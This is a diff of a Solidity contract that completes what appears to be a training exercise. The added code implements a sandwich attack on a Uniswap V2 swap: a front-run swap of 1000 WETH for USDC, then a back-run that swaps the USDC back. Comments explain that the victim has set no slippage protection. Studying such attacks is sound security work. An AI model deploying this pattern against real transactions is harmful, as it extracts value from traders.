@@ -13,15 +13,47 @@ import "./interfaces/IERC20.sol";
  * transaction to make profit.
  *
  */
+
+ /* 
+  Approach:
+  1. Attacker needs to send the frontrun transation with higher gas price than the victim's transaction.
+  2. Manipulate the price of the token such that the victiom get 0 price (he has set the minimum price to 0)
+  Now how to do that ?
+  That can be done by making the reserves of token to 0
+  3. The backrun transaction should be sent after the frontrun transaction and before the victim's transaction is mined which is done by sending the backrun with lower gas price.
+  
+
+  0 here did not mean we need to tilt the transaction so that victim gets zero. It specifies that the victim has no slippage protection and will accept any price for the tokens. we just
+  needed to make sure to change the liquidity heavily
+  
+   */
 contract Attacker {
     // This function will be called before the victim's transaction.
     function frontrun(address router, address weth, address usdc) public {
+
+        IUniswapV2Router uniswapRouter = IUniswapV2Router(router);
+         
         // your code here
+        IERC20(weth).approve(router , 1000 ether);
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = usdc;
+        uniswapRouter.swapExactTokensForTokens(1000 ether, 0, path, address(this), block.timestamp + 1 minutes);
+
     }
 
     // This function will be called after the victim's transaction.
     function backrun(address router, address weth, address usdc) public {
         // your code here
+        IUniswapV2Router uniswapRouter = IUniswapV2Router(router);
+
+        address[] memory path = new address[](2);
+        path[0] = usdc;
+        path[1] = weth;
+        
+        uint liquidity = IERC20(usdc).balanceOf(address(this));
+        IERC20(usdc).approve(router, liquidity);
+        uniswapRouter.swapExactTokensForTokens(liquidity, 0, path, address(this), block.timestamp + 1 minutes);
     }
 }
 
